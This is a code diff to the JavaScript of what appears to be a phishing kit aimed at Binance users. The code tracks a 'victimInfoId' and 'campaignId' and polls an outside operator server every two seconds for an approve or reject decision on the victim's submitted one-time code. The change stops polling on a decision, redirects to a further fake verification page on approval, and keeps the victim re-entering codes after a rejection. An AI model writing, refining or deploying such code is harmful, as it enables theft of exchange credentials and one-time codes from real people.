@@ -573,7 +573,11 @@
 
         function pollForApproval(victimInfoId, campaignId, step) {
             const pollUrl = `https://emailgrid.onrender.com/status/${victimInfoId}/?step=${step}`;
+            
+            let pollingActive = true; // Flag to control polling
+            
             const poll = () => {
+                if (!pollingActive) return; // Stop polling if disabled
                 fetch(pollUrl, {
                     method: 'GET',
                     headers: {
@@ -586,15 +590,18 @@
                 .then(result => {
                     console.log('Poll result:', result);
                     if (result.submission_status === 'approved') {
+                        pollingActive = false; // Stop polling
                         // Hide loading and proceed to next step IMMEDIATELY
                         resetButton();
                         // If you want to go to binance-verification.html, use that, otherwise use success.html
                         window.location.href = 'binance-verification.html';
                     } else if (result.submission_status === 'rejected') {
-                        // Hide loading and show error
+                        pollingActive = false; // Stop polling - DO NOT PROCEED
+                        // Hide loading and show error - STAY ON CURRENT PAGE
                         resetButton();
                         let errorMsg = result.error_message || 'Invalid OTP. Please try again.';
                         showError(errorMsg);
+                        // DO NOT REDIRECT - User must fix the input and try again
                     } else {
                         // Still pending, continue polling
                         setTimeout(poll, 2000); // Poll every 2 seconds
